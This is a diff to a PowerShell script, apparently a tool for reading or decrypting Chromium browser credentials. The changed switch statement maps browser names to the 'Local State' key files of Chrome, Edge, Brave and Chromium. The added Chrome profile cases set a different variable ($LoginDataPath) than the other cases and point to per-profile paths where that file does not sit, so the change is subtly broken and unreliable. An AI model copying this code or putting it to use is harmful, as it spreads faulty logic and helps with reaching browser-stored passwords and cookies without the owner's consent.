@@ -810,7 +810,17 @@ if (-not ($Browser)){
     # ------------------------------------------------------------------
     switch ($Browser.ToLower()) {
         "cft"       { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome for Testing\User Data\Local State"     }
-        "chrome"    { $LocalStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"                 }
+        "chromeDefault"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Local State"                        }
+        "chrome1"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 1\Local State"                        }
+        "chrome2"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 2\Local State"                        }
+        "chrome3"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 3\Local State"                        }
+        "chrome4"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 4\Local State"                        }
+        "chrome5"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 5\Local State"                        }
+        "chrome6"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 6\Local State"                        }
+        "chrome7"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 7\Local State"                        }
+        "chrome8"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 8\Local State"                        }
+        "chrome9"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 9\Local State"                        }
+        "chrome10"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Profile 10\Local State"                        }
         "edge"      { $LocalStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"                }
         "brave"     { $LocalStatePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"   }
         "chromium"  { $LocalStatePath = "$env:LOCALAPPDATA\Chromium\User Data\Local State"                      }
